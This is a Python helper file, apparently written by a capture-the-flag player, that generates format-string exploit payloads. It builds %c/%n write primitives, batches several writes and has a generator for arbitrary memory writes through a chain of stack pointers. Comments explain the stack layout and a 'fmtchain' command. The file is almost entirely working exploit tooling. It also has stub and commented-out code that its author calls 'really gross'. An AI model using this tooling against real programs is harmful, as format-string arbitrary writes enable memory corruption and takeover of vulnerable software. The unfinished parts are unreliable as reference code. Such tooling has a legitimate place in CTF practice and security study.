# advanced format string utils
# i know pwntools has some stuff but the code is wizard shit i don't get
from pwnlib.util.packing import p8, p16, p32, p64

def write_data(data, *args, **kwargs):
    pass

def chunks(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

fmt_map = {1: 'hh', 2: 'h', 4: '', 8: 'l'}
len_map = {1: 1<<8, 2: 1<<16,  4: 1<<32, 8: 1<<64}

def i2c(data, prevcnt=0):
    i = int.from_bytes(data, 'little')
    if prevcnt: i = (i - prevcnt) % len_map[len(data)]
    return f'%{i}c'.encode() if i else b''

def i2n(i, data):
    fmt = fmt_map[len(data)]
    return f'%{i}${fmt}n'.encode()

def write(offset, data, prevcnt:int|bytes=0):
    if isinstance(prevcnt, bytes): prevcnt = int.from_bytes(prevcnt, 'little')
    assert len(data) in [1, 2, 4, 8]
    if len(data) in [4, 8]: print("warning this is a big write")
    return i2c(data, prevcnt) + i2n(offset, data)

def write_many(writes: dict[int, bytes]):
    wl = []
    cnt = 0
    for where, what in writes.items():
        wl.append(write(where, what, cnt))
        cnt += int.from_bytes(what, 'little')
    return b''.join(wl)

# def chunk_int(i,)

"""
REALLY GROSS RN FIXFIXFIX
but once we have this we can split the stackless_arb_write into a set of single arb writes
also probably make something for pure stack writes since that's shorter and simpler
this is for arb write
"""
def single_arb_write(off_1, off_2, off_3, where, what, stack_leak):
    slbits = stack_leak & 0xff
    # build up the pointer
    for n in range(4):
        bits = (where >> (n*16)) & 0xffff
        shift = (slbits + (n+1)*2)
        yield write_many({off_2: p16(bits), off_1: p8(shift)})
    yield write(off_1, p8((slbits-bits)&0xff))
    # now start writing to the pointer
    for i, chunk in enumerate(chunks(what,2)):
        shift = ((where&0xff) + (i+1)*2)
        yield write_many({off_3: chunk, off_2: p8(shift)})
    

# arb write without stack control
# will return a list of format string payloads to run
# assumes there is a stack pointer pointing to a stack ptr on the stack
# this should always be here (ex. **env)
# when you find one, you should see on the stack:
# stackptr -> stackptr -> <whatever>
#   off1        off2         off3
# you can get these with the 'fmtchain' command
# def stackless_arb_write(off_1, off_2, off_3, writes, stack_leak=None)
    # for x in range(3):
        # n = 
    # return 